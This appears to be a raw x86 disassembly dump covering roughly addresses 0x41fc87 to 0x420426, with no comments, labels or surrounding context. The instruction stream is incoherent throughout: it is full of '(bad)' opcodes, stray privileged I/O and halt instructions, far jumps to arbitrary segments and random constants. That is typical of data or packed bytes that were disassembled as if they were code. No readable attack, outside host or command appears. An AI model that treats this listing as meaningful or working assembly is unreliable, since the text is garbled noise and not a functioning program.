  41fc87:	xchg   BYTE PTR [ebx-0x3110f659],al
  41fc8d:	push   es
  41fc8e:	cld    
  41fc8f:	cdq    
  41fc90:	imul   edi,DWORD PTR [eax-0x7b5448c4],0x63
  41fc97:	jo     0x41fc6e
  41fc99:	sub    DWORD PTR [eax+0x6b],0x6bbd2083
  41fca0:	fisttp WORD PTR [ebx-0x35]
  41fca3:	aad    0xcf
  41fca5:	xchg   edx,eax
  41fca6:	fsubr  st(1),st
  41fca8:	hlt    
  41fca9:	adc    DWORD PTR ds:0x92900b51,esp
  41fcaf:	or     al,0x2f
  41fcb1:	mov    eax,ds:0xdfb99713
  41fcb6:	lds    esp,FWORD PTR [ebx+0x0]
  41fcb9:	xchg   esp,eax
  41fcba:	and    BYTE PTR [ebx],dl
  41fcbc:	out    0x2e,al
  41fcbe:	add    dl,cl
  41fcc0:	ret    
  41fcc1:	outs   dx,BYTE PTR ds:[esi]
  41fcc2:	std    
  41fcc3:	xchg   ebp,eax
  41fcc4:	outs   dx,BYTE PTR ds:[esi]
  41fcc5:	hlt    
  41fcc6:	or     DWORD PTR [eax-0x764ba08],eax
  41fccc:	cli    
  41fccd:	sub    ah,BYTE PTR [ecx-0x7b01a8c4]
  41fcd3:	push   0xd19f4f75
  41fcd8:	add    al,ch
  41fcda:	xor    BYTE PTR [ebx+0x396b8868],cl
  41fce0:	and    al,0x62
  41fce2:	pop    edx
  41fce3:	lods   eax,DWORD PTR ds:[esi]
  41fce4:	retf   0x69be
  41fce7:	cmp    BYTE PTR [ecx],0x9a
  41fcea:	sahf   
  41fceb:	cdq    
  41fcec:	call   0x2057:0xddbfdf1c
  41fcf3:	fisttp QWORD PTR ds:0x12060ddd
  41fcf9:	loope  0x41fd4d
  41fcfb:	jecxz  0x41fcec
  41fcfd:	mov    ah,0x38
  41fcff:	fiadd  DWORD PTR [ebx-0x33]
  41fd02:	xor    eax,0x17314f24
  41fd07:	into   
  41fd08:	les    esi,FWORD PTR [ecx]
  41fd0a:	inc    edx
  41fd0b:	test   dl,bl
  41fd0d:	ins    BYTE PTR es:[edi],dx
  41fd0e:	fild   WORD PTR [edx+0x3d]
  41fd11:	fwait
  41fd12:	std    
  41fd13:	pop    ebx
  41fd14:	add    eax,0xe3bb45e1
  41fd19:	add    eax,0xf351b968
  41fd1e:	lea    ecx,[ebp-0x5]
  41fd21:	push   es
  41fd22:	xchg   BYTE PTR [eax+ebx*4-0x6],cl
  41fd26:	pop    ds
  41fd27:	cmc    
  41fd28:	mov    BYTE PTR [esi-0x18b1e242],0x9e
  41fd2f:	shl    dl,cl
  41fd31:	in     al,dx
  41fd32:	pusha  
  41fd33:	lahf   
  41fd34:	mov    DWORD PTR [edi-0x1a],ebx
  41fd37:	ror    DWORD PTR ds:0x9fcc5f18,cl
  41fd3d:	sbb    BYTE PTR ds:0x23fd95f4,0xae
  41fd44:	xor    edx,DWORD PTR [esi+0x2790ead2]
  41fd4a:	xchg   edi,eax
  41fd4b:	mov    bl,0x76
  41fd4d:	movmskps eax,xmm1
  41fd50:	push   esp
  41fd51:	cwde   
  41fd52:	fmul   QWORD PTR [edx+edi*2]
  41fd55:	xor    ebp,DWORD PTR [ecx]
  41fd57:	mov    al,ds:0xecb0d235
  41fd5c:	mov    DWORD PTR [edi+0x11],eax
  41fd5f:	xchg   BYTE PTR [esp+edx*4+0x60],cl
  41fd63:	arpl   WORD PTR [ebx+0x24bebd48],bx
  41fd69:	add    ecx,DWORD PTR [ebp-0x23e710ae]
  41fd6f:	sbb    eax,DWORD PTR [edx+eax*4+0x36]
  41fd73:	scas   eax,DWORD PTR es:[edi]
  41fd74:	mov    dl,0x10
  41fd76:	mov    ebx,0x303fb78a
  41fd7b:	mov    bh,BYTE PTR [edi-0x80]
  41fd7e:	mov    bl,0x66
  41fd80:	lods   eax,DWORD PTR ds:[esi]
  41fd81:	push   edx
  41fd82:	mov    al,ds:0x9742eae0
  41fd87:	pop    ecx
  41fd88:	jl     0x41fd7e
  41fd8a:	or     eax,0x66dfad6a
  41fd8f:	adc    eax,0xe8a0fcbb
  41fd94:	loope  0x41fdec
  41fd96:	jb     0x41fdc5
  41fd98:	sbb    al,0x14
  41fd9a:	out    dx,al
  41fd9b:	pop    esp
  41fd9c:	sar    BYTE PTR gs:[eax],cl
  41fd9f:	sbb    eax,0x56b9c4ca
  41fda4:	add    BYTE PTR [edi+eiz*1-0x4c14e0c1],cl
  41fdab:	dec    ecx
  41fdac:	dec    edi
  41fdad:	rcl    DWORD PTR [edi],cl
  41fdaf:	xor    eax,0xa73826f6
  41fdb4:	(bad)  
  41fdb5:	int3   
  41fdb6:	mov    bl,BYTE PTR [edx]
  41fdb8:	aaa    
  41fdb9:	aam    0x9b
  41fdbb:	std    
  41fdbc:	out    dx,al
  41fdbd:	add    al,0xae
  41fdbf:	mov    cl,0x8c
  41fdc1:	mov    esi,0xde449f7c
  41fdc6:	mov    al,ds:0x8df5d103
  41fdcb:	hlt    
  41fdcc:	ror    BYTE PTR [esp+esi*2+0x41],0x51
  41fdd1:	inc    ebx
  41fdd2:	sahf   
  41fdd3:	mov    esi,0xbf9bba90
  41fdd8:	div    ch
  41fdda:	ret    0x9dec
  41fddd:	out    dx,eax
  41fdde:	inc    ebx
  41fddf:	sbb    al,0x3f
  41fde1:	and    al,0x60
  41fde3:	mov    ?,esp
  41fde5:	mov    bh,0xba
  41fde7:	(bad)  
  41fde8:	xchg   esi,eax
  41fde9:	push   ss
  41fdea:	mov    edi,0xece25158
  41fdef:	adc    ah,BYTE PTR [ecx-0x71]
  41fdf2:	mov    ebx,0x6a65eaa2
  41fdf7:	pusha  
  41fdf8:	shr    bh,1
  41fdfa:	lock mov al,0x37
  41fdfd:	jb     0x41fe58
  41fdff:	out    dx,al
  41fe00:	fild   WORD PTR [edx+eiz*2]
  41fe03:	(bad)  
  41fe04:	(bad)  
  41fe05:	xchg   edx,eax
  41fe06:	fsub   QWORD PTR [ebp-0x15]
  41fe09:	push   ebx
  41fe0a:	mov    ebx,0xc3c8ded5
  41fe0f:	inc    ebx
  41fe10:	mov    edx,0x5156e400
  41fe15:	leave  
  41fe16:	mov    dl,0x99
  41fe18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe19:	or     eax,0x3451a3d3
  41fe1e:	ret    0x6037
  41fe21:	mov    esi,0xf304b74
  41fe26:	push   0x1865bdcb
  41fe2b:	sbb    ecx,ebx
  41fe2d:	sub    al,0x7a
  41fe2f:	xchg   edx,eax
  41fe30:	es push ds
  41fe32:	ficom  DWORD PTR [eax]
  41fe34:	mov    ebx,0x26e7e502
  41fe39:	mov    ebp,ss
  41fe3b:	xchg   edx,eax
  41fe3c:	std    
  41fe3d:	test   DWORD PTR [esi+0x1d5d1bfb],ebx
  41fe43:	add    DWORD PTR [eax],0xffffffac
  41fe46:	pusha  
  41fe47:	xchg   BYTE PTR [ebx],ah
  41fe49:	fistp  QWORD PTR [eax+0x722c21ee]
  41fe4f:	jge    0x41fe5c
  41fe51:	in     al,dx
  41fe52:	mov    ebx,0x5c7f6e86
  41fe57:	jo     0x41fe8f
  41fe59:	cdq    
  41fe5a:	push   es
  41fe5b:	sbb    BYTE PTR [edx],dh
  41fe5d:	(bad)
  41fe60:	push   ds
  41fe61:	loopne 0x41fdef
  41fe63:	stc    
  41fe64:	xchg   ebp,eax
  41fe65:	push   0xffffffd4
  41fe67:	loop   0x41fe93
  41fe69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe6a:	daa    
  41fe6b:	sbb    al,BYTE PTR [eax]
  41fe6d:	lahf   
  41fe6e:	mov    ah,0x9b
  41fe70:	mov    cl,0xe1
  41fe72:	ret    
  41fe73:	mov    edi,0x16954784
  41fe78:	mov    dh,0x88
  41fe7a:	cmp    eax,0xf4c08e68
  41fe7f:	add    ebx,DWORD PTR [edi]
  41fe81:	xor    al,bl
  41fe83:	ins    BYTE PTR es:[edi],dx
  41fe84:	(bad)  
  41fe85:	adc    eax,0xa4747fd0
  41fe8a:	das    
  41fe8b:	repnz (bad) 
  41fe8d:	pop    esp
  41fe8e:	ret    
  41fe8f:	mov    bh,0xaa
  41fe91:	mov    eax,ds:0x71a45bf7
  41fe96:	in     al,dx
  41fe97:	call   DWORD PTR [esi+0x57cf0c5e]
  41fe9d:	pop    ds
  41fe9e:	out    0xdb,eax
  41fea0:	and    cl,BYTE PTR [ebp+0x72]
  41fea3:	aad    0x35
  41fea5:	cwde   
  41fea6:	into   
  41fea7:	stos   DWORD PTR es:[di],eax
  41fea9:	jns    0x41ff19
  41feab:	cs sub al,0xa8
  41feae:	or     BYTE PTR [eax-0x2018d92c],0x3f
  41feb5:	pop    edi
  41feb6:	sbb    esp,esp
  41feb8:	adc    al,0x1
  41feba:	and    BYTE PTR [esi],cl
  41febc:	into   
  41febd:	add    esp,DWORD PTR [edi+0x21954dea]
  41fec3:	int3   
  41fec4:	adc    edx,DWORD PTR [ebx-0x70c7d03c]
  41feca:	daa    
  41fecb:	jp     0x41fec2
  41fecd:	jnp    0x41fe50
  41fecf:	shl    bl,cl
  41fed1:	out    0x6a,eax
  41fed3:	xor    eax,0x28a9846f
  41fed8:	fsubr  QWORD PTR [esi-0x16]
  41fedb:	sbb    ah,BYTE PTR [eax+0x44936ec3]
  41fee1:	pop    es
  41fee2:	iret   
  41fee3:	dec    ecx
  41fee4:	inc    edi
  41fee5:	or     DWORD PTR [ebx+0x68],edi
  41fee8:	data16 in al,0x68
  41feeb:	inc    edx
  41feec:	out    dx,eax
  41feed:	cwde   
  41feee:	shr    BYTE PTR [eax+eiz*4],0x87
  41fef2:	hlt    
  41fef3:	sbb    ch,BYTE PTR [ecx]
  41fef5:	jmp    0x3b841790
  41fefa:	sahf   
  41fefb:	ret    
  41fefc:	xor    ch,0x7c
  41feff:	icebp  
  41ff00:	cmp    edx,edi
  41ff02:	xchg   esi,eax
  41ff03:	sbb    ecx,ebp
  41ff05:	sbb    ecx,ecx
  41ff07:	fdivr  st,st(1)
  41ff09:	cmp    eax,0x8ffca3c7
  41ff0e:	daa    
  41ff0f:	ins    BYTE PTR es:[edi],dx
  41ff10:	adc    DWORD PTR [edi+esi*1],ecx
  41ff13:	push   edx
  41ff14:	sti    
  41ff15:	adc    al,0x42
  41ff17:	push   esp
  41ff18:	pusha  
  41ff19:	mov    esi,0x453bf207
  41ff1e:	cwde   
  41ff1f:	push   edx
  41ff20:	test   eax,0x6878778e
  41ff25:	and    al,BYTE PTR [eax+0xb]
  41ff28:	lock in al,dx
  41ff2a:	mov    esp,0xcacef38b
  41ff2f:	push   0xfb0b8f1a
  41ff34:	inc    eax
  41ff35:	loop   0x41ffb1
  41ff37:	cmc    
  41ff38:	sbb    BYTE PTR ds:0x9ab16e98,ch
  41ff3e:	stos   DWORD PTR es:[edi],eax
  41ff3f:	outs   dx,BYTE PTR ds:[esi]
  41ff40:	sbb    BYTE PTR [esi+0x123463dd],bl
  41ff46:	into   
  41ff47:	xchg   ecx,eax
  41ff48:	inc    edx
  41ff49:	rcl    BYTE PTR [ebp+0x9],0xa
  41ff4d:	mov    cl,0x31
  41ff4f:	or     DWORD PTR [ebp-0x1d0dbc00],esi
  41ff55:	outs   dx,BYTE PTR ds:[esi]
  41ff56:	popf   
  41ff57:	je     0x41ff13
  41ff59:	fwait
  41ff5a:	inc    ebp
  41ff5b:	dec    esp
  41ff5c:	fistp  QWORD PTR [ebx+0x1a]
  41ff5f:	mov    bl,0x87
  41ff61:	lods   eax,DWORD PTR ds:[esi]
  41ff62:	dec    eax
  41ff63:	popa   
  41ff64:	test   ebx,eax
  41ff66:	adc    BYTE PTR [ebx],0x7c
  41ff69:	jmp    0x8befb5fc
  41ff6e:	retf   0x86d
  41ff71:	mov    ah,0x31
  41ff73:	cmp    esi,DWORD PTR [ecx-0x6975f482]
  41ff79:	cmp    BYTE PTR [edx+0x68],dh
  41ff7c:	and    ecx,ebx
  41ff7e:	loope  0x41ffd5
  41ff80:	ud0    edi,DWORD PTR [edi+0xd]
  41ff84:	imul   eax
  41ff86:	nop
  41ff87:	out    0xad,eax
  41ff89:	(bad)  
  41ff8a:	cmc    
  41ff8b:	out    dx,eax
  41ff8c:	out    dx,al
  41ff8d:	xchg   edx,eax
  41ff8e:	test   al,0x49
  41ff90:	sbb    eax,0x7f084216
  41ff95:	retf   0x5ee
  41ff98:	inc    eax
  41ff99:	jle    0x41ff56
  41ff9b:	gs or  esi,esp
  41ff9e:	xor    esp,DWORD PTR [esi]
  41ffa0:	mov    esi,DWORD PTR [eax]
  41ffa2:	in     eax,dx
  41ffa3:	mov    BYTE PTR [edi-0x48e02416],ah
  41ffa9:	jle    0x41ff44
  41ffab:	xor    BYTE PTR [edi+0x6e],al
  41ffae:	sub    DWORD PTR [edi+0x13],eax
  41ffb1:	xor    dl,BYTE PTR [edx]
  41ffb3:	cmp    eax,0x614cb91d
  41ffb8:	popf   
  41ffb9:	mov    edi,0xeb6775b2
  41ffbe:	push   ebp
  41ffbf:	fistp  WORD PTR [ecx-0x3a]
  41ffc2:	mov    ds:0x99307615,al
  41ffc7:	inc    esi
  41ffc8:	mov    ecx,0x49f7388a
  41ffcd:	in     eax,dx
  41ffce:	xor    esp,DWORD PTR [ebx+0x28]
  41ffd1:	add    DWORD PTR [edx+0x4dfc75f2],eax
  41ffd7:	sub    BYTE PTR [edi+ecx*4],al
  41ffda:	cld    
  41ffdb:	sti    
  41ffdc:	cmp    al,0x42
  41ffde:	ds add bh,ah
  41ffe1:	cmp    bh,BYTE PTR [ebx+0x70]
  41ffe4:	mov    eax,0x288be243
  41ffe9:	mul    ecx
  41ffeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffec:	dec    DWORD PTR [ecx]
  41ffee:	fiadd  DWORD PTR [eax+0x73]
  41fff1:	push   esp
  41fff2:	fs int3 
  41fff4:	data16 fdivr DWORD PTR [ebx+edi*2]
  41fff8:	call   0xd837:0x6c4be478
  41ffff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420000:	fidivr WORD PTR [esi]
  420002:	xchg   edx,eax
  420003:	push   0xffffffbd
  420005:	(bad)  [eax]
  420007:	jmp    0x5081435b
  42000c:	xchg   ecx,eax
  42000d:	cmp    DWORD PTR [eax+ecx*1],eax
  420010:	pop    edx
  420011:	mov    ebp,DWORD PTR [ecx-0x22]
  420014:	push   eax
  420015:	xor    esp,edx
  420017:	popa   
  420018:	fcomp  QWORD PTR [ecx-0x70]
  42001b:	xchg   esp,eax
  42001c:	xchg   esi,eax
  42001d:	push   ss
  42001e:	or     eax,0xbaa121d6
  420023:	xor    dl,bl
  420025:	imul   ebx,DWORD PTR [esi],0x4
  420028:	xor    dl,BYTE PTR [edi-0x74ab01a7]
  42002e:	pop    ebp
  42002f:	dec    ebx
  420030:	push   0xffffffab
  420032:	(bad)  
  420033:	adc    al,0x70
  420035:	popf   
  420036:	stos   DWORD PTR es:[edi],eax
  420037:	adc    BYTE PTR [ebp-0x2e9d58e2],dl
  42003d:	sbb    ah,BYTE PTR [edi+0x2f]
  420040:	cmp    al,0x95
  420042:	mov    al,0xaf
  420044:	cmp    ebp,DWORD PTR [ecx]
  420046:	sbb    eax,0x7c8d272d
  42004b:	push   esp
  42004c:	iret   
  42004d:	fist   WORD PTR [ecx]
  42004f:	js     0x41ffde
  420051:	xchg   ebp,eax
  420052:	test   ah,dh
  420054:	out    dx,al
  420055:	inc    eax
  420056:	mov    ah,0xc6
  420058:	pop    ds
  420059:	int    0x8c
  42005b:	iret   
  42005c:	shr    BYTE PTR [ebx-0x70],1
  42005f:	sub    al,0x45
  420061:	sub    ebx,DWORD PTR [esi-0x4f6407ec]
  420067:	push   0xe635b39e
  42006c:	mov    ebx,ss
  42006e:	push   esp
  42006f:	popf   
  420070:	sbb    edx,ebx
  420072:	add    eax,0xb25702ba
  420077:	jns    0x4200cc
  420079:	sbb    BYTE PTR [esi-0x67559f58],bl
  42007f:	jns    0x420089
  420081:	clc    
  420082:	cmp    ah,ch
  420084:	xor    ebp,ecx
  420086:	cs cs inc esi
  420089:	push   0x52
  42008b:	retf   0xff47
  42008e:	fstp   QWORD PTR [ebx]
  420090:	aaa    
  420091:	sbb    DWORD PTR [ebx+ecx*2-0x54],eax
  420095:	enter  0x7483,0xf5
  420099:	xor    bl,BYTE PTR [ebp+ebp*8+0x273f34c]
  4200a0:	lock push edx
  4200a2:	loop   0x4200f6
  4200a4:	out    dx,al
  4200a5:	adc    al,0x69
  4200a7:	dec    ecx
  4200a8:	mov    bl,0xfc
  4200aa:	in     eax,0x12
  4200ac:	and    esp,DWORD PTR [esi]
  4200ae:	dec    esi
  4200af:	pop    ds
  4200b0:	and    al,0xc
  4200b2:	pop    esp
  4200b3:	dec    ebp
  4200b4:	xchg   esi,eax
  4200b5:	or     dh,ah
  4200b7:	aaa    
  4200b8:	outs   dx,BYTE PTR ds:[esi]
  4200b9:	hlt    
  4200ba:	les    ecx,FWORD PTR [eax+0x77d36e0b]
  4200c0:	dec    edx
  4200c1:	or     eax,0x46945b75
  4200c6:	loop   0x42009c
  4200c8:	push   0xffffffc7
  4200ca:	cmp    DWORD PTR [esi+0x766c1623],ebp
  4200d0:	stos   BYTE PTR es:[edi],al
  4200d1:	push   esi
  4200d2:	mov    eax,0x6c60e103
  4200d7:	js     0x4200c0
  4200d9:	aad    0xfb
  4200db:	pop    edi
  4200dc:	inc    esi
  4200dd:	push   edx
  4200de:	mov    bh,0x8f
  4200e0:	gs jo  0x42010e
  4200e3:	sbb    eax,0x96fa5b36
  4200e8:	int    0x13
  4200ea:	lock or esi,DWORD PTR [ecx+edx*2]
  4200ee:	mov    esi,0x599c0f6f
  4200f3:	sbb    ebx,DWORD PTR [esi-0x54]
  4200f6:	pop    ebp
  4200f7:	pop    ebp
  4200f8:	imul   al
  4200fa:	lods   al,BYTE PTR ds:[esi]
  4200fb:	retf   
  4200fc:	add    esp,DWORD PTR [ebp+ebp*4+0x25ae98d0]
  420103:	mov    esp,0xa0df3895
  420108:	out    0x7a,eax
  42010a:	imul   DWORD PTR [ebx+eiz*2-0x1a]
  42010e:	adc    DWORD PTR ds:0xd9790dd1,ebx
  420114:	sub    eax,0xa7a2fc35
  420119:	mov    cl,0x83
  42011b:	inc    ebx
  42011c:	nop
  42011d:	pop    ebp
  42011e:	mov    edi,0xb9dd4bc3
  420123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420124:	pop    es
  420125:	xchg   edi,eax
  420126:	lahf   
  420127:	jmp    0x4200ba
  420129:	add    bl,al
  42012b:	ss pop edi
  42012d:	test   BYTE PTR [ebp-0x491942d9],0x90
  420134:	sahf   
  420135:	add    DWORD PTR [edx],edi
  420137:	ja     0x420111
  420139:	sub    al,BYTE PTR [esi+ecx*8+0x5b]
  42013d:	push   ds
  42013e:	sbb    DWORD PTR [eax-0xa],esi
  420141:	mov    ebp,edi
  420143:	shr    DWORD PTR [edx],0x8
  420146:	out    0xe4,al
  420148:	lods   al,BYTE PTR ds:[esi]
  420149:	out    dx,al
  42014a:	jecxz  0x420141
  42014c:	or     esi,DWORD PTR [edi+eiz*8-0x5b]
  420150:	push   es
  420151:	imul   ecx,DWORD PTR [edi+0x66],0x2648fe
  420158:	sub    dh,BYTE PTR [esi+0x2f]
  42015b:	sub    edx,ebp
  42015d:	or     edi,DWORD PTR ds:0x69481d91
  420163:	sbb    DWORD PTR [ebp-0x1b],ebp
  420166:	xchg   ecx,eax
  420167:	mov    bh,0x2
  420169:	adc    BYTE PTR [eax],ah
  42016b:	xor    eax,0x4ba23273
  420170:	adc    BYTE PTR [edi],ch
  420172:	jmp    0x254a:0x4a3e370d
  420179:	fst    QWORD PTR [edi]
  42017b:	or     al,0xa4
  42017d:	cli    
  42017e:	dec    esp
  42017f:	rol    DWORD PTR [edi+eiz*1+0x156fb9d1],cl
  420186:	daa    
  420187:	(bad)  
  420188:	fidiv  WORD PTR [ebp+ebx*2-0x37]
  42018c:	jne    0x420174
  42018e:	cmp    eax,0xb004bbf8
  420193:	das    
  420194:	test   bl,bh
  420196:	test   eax,0xc182ff7f
  42019b:	jbe    0x4201dd
  42019d:	or     eax,0x59e181f
  4201a2:	inc    edi
  4201a3:	jbe    0x4201c9
  4201a5:	ror    DWORD PTR [ecx],cl
  4201a7:	mov    dh,0x49
  4201a9:	ins    DWORD PTR es:[edi],dx
  4201aa:	stos   BYTE PTR es:[edi],al
  4201ab:	dec    ebp
  4201ac:	pusha  
  4201ad:	pop    ds
  4201ae:	mov    BYTE PTR [ebx-0x22],al
  4201b1:	push   esp
  4201b2:	mov    al,ds:0x1257aa0b
  4201b7:	adc    al,BYTE PTR [esi+0x3847d965]
  4201bd:	leave  
  4201be:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4201c0:	dec    esp
  4201c1:	mov    DWORD PTR [edx],edx
  4201c3:	sar    BYTE PTR [ecx+0x29],cl
  4201c6:	jmp    0x4201ae
  4201c8:	mov    cs,eax
  4201ca:	in     eax,0x4d
  4201cc:	(bad)  
  4201cd:	in     al,0xaf
  4201cf:	aaa    
  4201d0:	jo     0x4201eb
  4201d2:	push   ss
  4201d3:	in     eax,0x18
  4201d5:	fs test al,0xf9
  4201d8:	and    DWORD PTR [eax-0x2a4a8534],0xffffffcf
  4201df:	imul   esi,ebp,0xcd34434b
  4201e5:	test   DWORD PTR [edx+0xd],0x2acb9417
  4201ec:	xchg   ecx,esi
  4201ee:	inc    ebx
  4201ef:	pop    ecx
  4201f0:	loope  0x42019c
  4201f2:	push   edi
  4201f3:	nop
  4201f4:	jl     0x42018b
  4201f6:	xor    al,0xa4
  4201f8:	mov    dh,0x3e
  4201fa:	stos   BYTE PTR es:[edi],al
  4201fb:	mov    eax,0x70eb9a6f
  420200:	or     esi,DWORD PTR [esp+ebx*4-0x2a2d7830]
  420207:	pop    edi
  420208:	mov    al,0x2a
  42020a:	cmp    BYTE PTR [edi-0x16b108bd],bl
  420210:	imul   edx,esi,0xffffff99
  420213:	and    DWORD PTR [esi+edi*2+0x72843ab4],edi
  42021a:	(bad)  
  42021b:	lock (bad) 
  42021d:	lods   al,BYTE PTR ds:[esi]
  42021e:	add    DWORD PTR [edx-0x4],eax
  420221:	(bad)  
  420222:	loop   0x4201ac
  420224:	add    esp,edi
  420226:	inc    ecx
  420227:	enter  0x78d7,0xb2
  42022b:	(bad)  
  42022c:	pusha  
  42022d:	mul    DWORD PTR [ecx-0x1870f76c]
  420233:	popf   
  420234:	and    eax,0x7d303567
  420239:	es dec edx
  42023b:	out    0x27,eax
  42023d:	push   eax
  42023e:	sbb    bl,BYTE PTR [edx-0x51fb0bc5]
  420244:	add    eax,0x994dfa8a
  420249:	xor    BYTE PTR [edi-0x67],cl
  42024c:	nop
  42024d:	jne    0x42024f
  42024f:	sub    dl,bl
  420251:	outs   dx,DWORD PTR ds:[esi]
  420252:	imul   ebp,DWORD PTR [eax+esi*2-0x75],0x89cbc5e0
  42025a:	mov    ch,cl
  42025c:	sbb    eax,0x4f3158bc
  420261:	xor    BYTE PTR [eax],al
  420263:	pop    ebp
  420264:	inc    esp
  420265:	pop    ebp
  420266:	shr    BYTE PTR [ecx],0xca
  420269:	add    BYTE PTR [edi],dl
  42026b:	leave  
  42026c:	inc    edx
  42026d:	out    dx,eax
  42026e:	sub    bl,BYTE PTR [edi+0x22a89033]
  420274:	mov    edi,0x460979f
  420279:	inc    ebp
  42027a:	xchg   edx,eax
  42027b:	add    DWORD PTR [edx+0x63],0x39
  42027f:	push   ecx
  420280:	xor    BYTE PTR [eax+0x5d5dcac9],dl
  420286:	push   ecx
  420287:	mov    WORD PTR [eax-0x18],ds
  42028a:	mov    DWORD PTR [ebp-0x79d06391],eax
  420290:	jns    0x4202d5
  420292:	repz shl DWORD PTR [edi-0x6bb5fd29],0x87
  42029a:	fsubr  DWORD PTR [eax]
  42029c:	dec    ecx
  42029d:	add    eax,0xc5855963
  4202a2:	lods   al,BYTE PTR ds:[esi]
  4202a3:	cmp    dl,0xe2
  4202a6:	lea    ebx,[ebx+0x1e]
  4202a9:	dec    eax
  4202aa:	add    ebx,DWORD PTR [ebx+ebx*4]
  4202ad:	(bad)  
  4202ae:	test   DWORD PTR [ebp-0x22],0x9ff94576
  4202b5:	mov    esp,0xba4c5d1e
  4202ba:	shl    BYTE PTR [edi-0x11],0xa4
  4202be:	pop    ebp
  4202bf:	push   cs
  4202c0:	mov    bl,0xc6
  4202c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202c3:	fmul   QWORD PTR [esi-0x15b61a20]
  4202c9:	fnsave [ebp+eiz*4+0x71abfd13]
  4202d0:	shl    DWORD PTR [edx-0x681cc830],1
  4202d6:	pop    ds
  4202d7:	loopne 0x42026f
  4202d9:	push   0x92e92845
  4202de:	repz lahf 
  4202e0:	and    eax,0x431dcd88
  4202e5:	add    al,0x95
  4202e7:	(bad)  
  4202e8:	xlat   BYTE PTR ds:[ebx]
  4202e9:	pop    edi
  4202ea:	and    BYTE PTR [ebx],dh
  4202ec:	dec    ecx
  4202ed:	xchg   ebx,eax
  4202ee:	mov    ah,0xcc
  4202f0:	push   esi
  4202f1:	in     eax,0x6b
  4202f3:	mov    ch,BYTE PTR [ebx-0x31]
  4202f6:	std    
  4202f7:	sbb    esi,DWORD PTR [ecx-0x7f]
  4202fa:	inc    ecx
  4202fb:	shl    DWORD PTR [edi+0x15],cl
  4202fe:	cmc    
  4202ff:	ret    
  420300:	ss jge 0x42030b
  420303:	clc    
  420304:	inc    edx
  420305:	jmp    0xbe21:0xc85c824
  42030c:	loopne 0x420381
  42030e:	xor    BYTE PTR [eax+0x47],ch
  420311:	sbb    esp,DWORD PTR ds:0xc2756a02
  420317:	out    0xde,eax
  420319:	push   esp
  42031a:	lods   al,BYTE PTR ds:[esi]
  42031c:	test   DWORD PTR [ebx+0x474ed42b],esi
  420322:	nop
  420323:	int3   
  420324:	mov    bh,0xc1
  420326:	rol    BYTE PTR [edx-0x72b7b8be],0xe3
  42032d:	and    DWORD PTR [esi],esi
  42032f:	xor    BYTE PTR [esi+ebp*1+0x73],cl
  420333:	push   es
  420334:	dec    ebx
  420335:	mov    ah,0x82
  420337:	shl    DWORD PTR [edi+0x48],cl
  42033a:	pop    esi
  42033b:	retf   0xc463
  42033e:	adc    DWORD PTR [esi+0x2],ebx
  420341:	loope  0x4202f8
  420343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420344:	(bad)  
  420345:	ss push 0x5f23d551
  42034b:	sub    eax,esi
  42034d:	adc    eax,ebx
  42034f:	pop    ebx
  420350:	sbb    DWORD PTR [esi-0x2276c617],ebx
  420356:	sub    al,0xf9
  420358:	xchg   BYTE PTR [edx+0x35],dh
  42035b:	ror    BYTE PTR [esi],cl
  42035d:	into   
  42035e:	pushf  
  42035f:	inc    edx
  420360:	leave  
  420361:	pop    ss
  420362:	or     eax,0xebbb3c71
  420367:	fadd   DWORD PTR [eax*2+0x789045be]
  42036e:	add    esi,DWORD PTR [edi]
  420370:	mov    BYTE PTR [eax],ah
  420372:	hlt    
  420373:	mov    edi,0xbf146cd4
  420378:	xlat   BYTE PTR ds:[ebx]
  420379:	or     al,BYTE PTR [ebx+0x69]
  42037c:	cmp    al,0x54
  42037e:	or     DWORD PTR [eax+0x37],eax
  420381:	into   
  420382:	adc    esp,DWORD PTR [edi+0x58]
  420385:	popf   
  420386:	mov    ebx,0x9eee6868
  42038b:	xchg   DWORD PTR [ebp+0x68d56924],ebp
  420391:	repz shl cl,1
  420394:	dec    edx
  420395:	sub    DWORD PTR [esi-0x34fd6d6a],esp
  42039b:	(bad)  
  42039c:	stc    
  42039d:	sbb    edi,0xffffffb7
  4203a0:	sbb    al,0x59
  4203a2:	repnz sub dh,BYTE PTR [edi+ebx*2+0x5d1864a8]
  4203aa:	call   0xce76e84f
  4203af:	cs mul esp
  4203b2:	pop    es
  4203b3:	xchg   esp,eax
  4203b4:	stos   BYTE PTR es:[edi],al
  4203b5:	mov    ds:0x43037353,eax
  4203ba:	add    esp,edi
  4203bc:	mov    dl,0xc5
  4203be:	xor    BYTE PTR [esi],bh
  4203c0:	add    al,0x7c
  4203c2:	rcl    BYTE PTR [ebp+0x5b],cl
  4203c5:	verr   dx
  4203c8:	test   BYTE PTR [edx+eax*1+0x69],dl
  4203cc:	xor    ebp,eax
  4203ce:	mov    DWORD PTR [edx],esi
  4203d0:	ins    DWORD PTR es:[edi],dx
  4203d1:	or     ah,BYTE PTR [edi-0x14]
  4203d4:	aas    
  4203d5:	je     0x42039b
  4203d7:	cmp    ah,BYTE PTR [edx+0x75]
  4203da:	and    ebx,edi
  4203dc:	fisttp DWORD PTR [eax-0x49d07b4d]
  4203e2:	sbb    BYTE PTR [ebx+0x32],bl
  4203e5:	(bad)  
  4203e7:	(bad)  
  4203e8:	fisub  WORD PTR [esi+edi*1]
  4203eb:	mov    ds:0x92635b08,al
  4203f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203f1:	sbb    al,BYTE PTR [edx]
  4203f3:	jmp    0xec19:0x8d0e3f08
  4203fa:	mov    eax,ds:0xc188858b
  4203ff:	pop    esi
  420400:	pop    esi
  420401:	dec    esp
  420402:	ret    0x79df
  420405:	dec    ebx
  420406:	std    
  420407:	push   edx
  420408:	and    DWORD PTR [ebp+0x44],esp
  42040b:	sub    bh,BYTE PTR [ebx+0x434bfe90]
  420411:	int    0xaa
  420413:	aaa    
  420414:	imul   ecx,DWORD PTR [eax-0x164b219c],0x3f4bee3f
  42041e:	sahf   
  42041f:	repz cmp eax,0x887eb42d
  420425:	pop    eax
  420426:	in     eax,dx
